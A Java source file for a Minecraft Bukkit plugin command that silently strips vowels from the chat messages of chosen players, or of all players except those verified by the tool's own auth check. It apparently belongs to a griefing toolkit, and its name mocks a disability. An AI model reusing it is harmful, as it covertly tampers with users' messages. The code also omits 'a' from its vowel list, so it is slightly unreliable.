package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class Dyslexia implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();
    private final ArrayList<String> vowels = new ArrayList<>();
    private boolean allDyslexia = false;
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"dyslexia"};
    }

    @Override
    public String getDescription() {
        return "Remove all vowels from their messages.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Usage: dyslexia <player | *>");
            return;
        }

        if (args[0].equals("*")) {
            this.allDyslexia = !this.allDyslexia;
            if (!allDyslexia) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "All players are no longer dyslexic!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Success + "All players are now dyslexic!");
            }

            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player could not be found!");
            return;
        }

        if (toggled.contains(found.getUniqueId())) {
            toggled.remove(found.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + found.getName() + " is no longer dyslexic!");
            return;
        }

        toggled.add(found.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + found.getName() + " is now dyslexic!");
    }

    @Override
    public void onEnable(Z_ z) {
        vowels.add("e");
        vowels.add("i");
        vowels.add("o");
        vowels.add("u");

        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    private boolean isDyslexic(Player p) throws IOException, InterruptedException {
        if (toggled.contains(p.getUniqueId())) {
            return true;
        }

        return this.allDyslexia && !this.z.getAuth().isVerified(p.getName());
    }

    @EventHandler(priority = EventPriority.LOWEST)
    private void onChat(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        if (this.isDyslexic(e.getPlayer())) {
            String message = e.getMessage();
            for (String vowel : this.vowels) {
                message = message.replace(vowel, "");
            }

            e.setMessage(message);
        }
    }
}
